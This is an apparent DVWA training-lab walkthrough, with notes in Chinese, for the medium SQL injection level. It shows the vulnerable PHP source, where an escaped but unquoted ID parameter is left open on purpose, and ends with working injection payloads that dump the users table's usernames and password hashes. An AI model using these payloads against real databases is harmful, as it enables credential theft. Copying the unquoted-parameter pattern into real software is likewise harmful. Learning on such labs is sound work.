# SQL Injection - Medium

## View Source

```PHP
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

- [`mysqli_real_escape_string()`](https://www.php.net/manual/zh/mysqli.real-escape-string.php)
	- 過濾 `\0 (NUL) \n \r ctl-Z " ' \`
	- [`mysql_real_escape_string()`](https://www.php.net/manual/zh/function.mysql-real-escape-string.php)
		- 已被移除

### View `index.php`

1. `docker exec -it dvwa /bin/bash`
2. `vim /var/www/html/vulnerabilities/sqli/index.php`
- https://github.com/digininja/DVWA/blob/master/vulnerabilities/sqli/index.php#L52

```PHP
if( $vulnerabilityFile == 'medium.php' ) {
	$page[ 'body' ] .= "\n				<select name=\"id\">";

	for( $i = 1; $i < $number_of_rows + 1 ; $i++ ) { $page[ 'body' ] .= "<option value=\"{$i}\">{$i}</option>"; }
	$page[ 'body' ] .= "</select>";
}
```

- `$number_of_rows` 在這裡被用來產生指定數量的下拉式選單選項

### View Page Source

```HTML
<div class="vulnerable_code_area">
  <form action="#" method="POST">
    <p>
      User ID:
      <select name="id">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
      </select>
      <input type="submit" name="Submit" value="Submit">
    </p>

  </form>
  
</div>
```

- 改成下拉式選單且改成 *POST*

## Code Review

- 將 *GET* 改成 *POST* 並過濾特殊字元來防止 *SQLi*

## Answer

- 仔細觀察可以發現查詢語句有些微不同
1. 原本的 *PHP* 語句
	- `$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";`
2. 雙引號裡面的 *SQL* 語句
	- `SELECT first_name, last_name FROM users WHERE user_id = $id;`
3. 因為 `$id` 沒有用引號包起來，所以不需要增加 `'` 來截斷，也就不需要怕被過濾
	- `SELECT first_name, last_name FROM users WHERE user_id = 0 OR 1=1;`
4. 因為是 *POST* 的方式，方便的話可以直接透過 *F12 DevTools* 來更改成要注入的語句；或者可以使用 *Burp Suite* 的 *Proxy* 來攔截和修改發出的請求封包

### Example

```
0 OR 1=1
0 UNION SELECT user, password FROM users
```